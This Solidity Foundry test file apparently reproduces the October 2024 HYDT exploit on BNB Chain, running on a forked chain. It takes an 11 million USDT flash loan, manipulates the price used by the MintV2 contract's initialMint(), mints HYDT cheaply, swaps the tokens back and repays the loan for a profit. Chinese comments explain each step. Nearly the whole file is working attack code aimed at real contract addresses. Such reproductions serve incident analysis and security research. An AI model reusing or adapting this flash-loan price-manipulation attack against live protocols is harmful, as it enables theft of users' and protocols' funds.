// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// 2024-10-10 HYDT(BNB)
// attack :    0x4645863205b47a0a3344684489e8c446a437d66c
// attack tx : 0xa9df1bd97cf6d4d1d58d3adfbdde719e46a1548db724c2e76b4cd4c3222f22b3
// attack contract : 0x8f921e27e3af106015d1c3a244ec4f48dbfcad14
// Attack analysis : https://app.blocksec.com/explorer/tx/bsc/0xa9df1bd97cf6d4d1d58d3adfbdde719e46a1548db724c2e76b4cd4c3222f22b3
// X:  https://x.com/TenArmorAlert/status/1844247004551262678


contract ContractTest is Test {
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Uni_Pair_V3 pool = Uni_Pair_V3(0x92b7807bF19b7DDdf89b706143896d05228f3121);
    Uni_Pair_V2 pair = Uni_Pair_V2(0x5E901164858d75852EF548B3729f44Dd93209c9c);
    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Router_V3 routerV3 = Uni_Router_V3(0x1b81D678ffb9C0263b24A97847620C99d213eB14);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 HYDT = IERC20(0x9810512Be701801954449408966c630595D0cD51);
    uint256 borrow_amount;
    address MintV2 = 0xA2268Fcc2FE7A2Bb755FbE5A7B3Ac346ddFeDB9B;

    function setUp() external {
        // fork 到 BSC中的这个区块号进行攻击复现
        cheats.createSelectFork("bsc", 42_985_310);
        // 定义攻击开始之前原本攻击者拥有的USDT，这里可以任意设置数量
        deal(address(USDT), address(this), 0);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker USDT before exploit", USDT.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Begin] Attacker WBNB before exploit", WBNB.balanceOf(address(this)), 18);
        console.log("-----------------------------------------------------------");
        // 定义借款 11,000,000 个USDT
        borrow_amount = 11_000_000 ether; 
        // 调用flash实现闪电贷完成价格操纵
        pool.flash(address(this), borrow_amount, 0, "");
        console.log("-----------------------------------------------------------");
        emit log_named_decimal_uint("[End] Attacker USDT after exploit", USDT.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker WBNB after exploit", WBNB.balanceOf(address(this)), 18);
    }

    // 模拟pancakeV3FlashCallback函数，fee0, fee1=0,
    function pancakeV3FlashCallback(uint256 fee0, uint256, /*fee1*/ bytes memory /*data*/ ) public {
        //console.log("pancakeV3FlashCallback");

        console.log("[flash] USDT obtained through flash loan: ", USDT.balanceOf(address(this)) / 1e18);
        console.log("[Swap]");
        swap_token_to_token(address(USDT), address(WBNB), USDT.balanceOf(address(this)));
        console.log("[Swap] USDT after exchange: ", USDT.balanceOf(address(this)) / 1e18);
        console.log("[Swap] WBNB after exchange: ", WBNB.balanceOf(address(this)) / 1e18);

        WBNB.withdraw(11 ether);
        // 向MintV2合约中转入11ETH并调用initialMint()
        console.log("!!!The price of the prophecy is manipulated here!!!");
        (bool success,) = MintV2.call{value: 11 ether}(abi.encodeWithSignature("initialMint()"));
        require(success, "MintV2 call failed");
        emit log_named_decimal_uint("HYDT can mint", HYDT.balanceOf(address(this)), 18);
       
        console.log("[exactInputSingle] HYDT -> USDT");
        uint256 v3_amount = HYDT.balanceOf(address(this)) / 2;
        HYDT.approve(address(routerV3), v3_amount);
        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(HYDT),
            tokenOut: address(USDT),
            deadline: type(uint256).max,
            recipient: address(this),
            amountIn: v3_amount,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0,
            fee: 500
        });
        routerV3.exactInputSingle(_Params);
        console.log("[exactInputSingle] HYDT after exchange: ", HYDT.balanceOf(address(this)) / 1e18);
        console.log("[exactInputSingle] USDT after exchange: ", USDT.balanceOf(address(this)) / 1e18);

        console.log("[Swap1] HYDT -> WBNB:");
        console.log("start: HYDT: %d ---------   WBNB: %d", HYDT.balanceOf(address(this)) / 1e18, WBNB.balanceOf(address(this)) / 1e18);
        swap_token_to_token(address(HYDT), address(WBNB), HYDT.balanceOf(address(this)) / 2);
        console.log("end: HYDT: %d --------- WBNB: %d", HYDT.balanceOf(address(this)) / 1e18, WBNB.balanceOf(address(this)) / 1e18);

        console.log("[Swap2] HYDT -> USDT:");
        console.log("start: HYDT: %d ---------   USDT: %d", HYDT.balanceOf(address(this)) / 1e18, USDT.balanceOf(address(this)) / 1e18);
        swap_token_to_token(address(HYDT), address(USDT), HYDT.balanceOf(address(this)));
        console.log("end: HYDT: %d --------- USDT: %d", HYDT.balanceOf(address(this)) / 1e18, USDT.balanceOf(address(this)) / 1e18);

        console.log("[Swap3] WBNB -> USDT:");
        console.log("start: WBNB: %d ---------   USDT: %d", WBNB.balanceOf(address(this)) / 1e18, USDT.balanceOf(address(this)) / 1e18);
        swap_token_to_token(address(WBNB), address(USDT), WBNB.balanceOf(address(this)));
        console.log("start: WBNB: %d ---------   USDT: %d", WBNB.balanceOf(address(this)) / 1e18, USDT.balanceOf(address(this)) / 1e18);
        
        USDT.transfer(address(pool), borrow_amount + fee0);
        emit log_named_decimal_uint("[Fee]", fee0, 18);
        console.log("[more USDT] = USDT - Fee - Borrow = 11006802 - 1100 - 11000000 = 5702");
    }

        function swap_token_to_token(address A, address B, uint256 amount) internal {
        IERC20(A).approve(address(router), amount);
        address[] memory path = new address[](2);
        path[0] = address(A);
        path[1] = address(B);
        // 模拟swapExactTokensForTokens函数
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }

    receive() external payable {}

}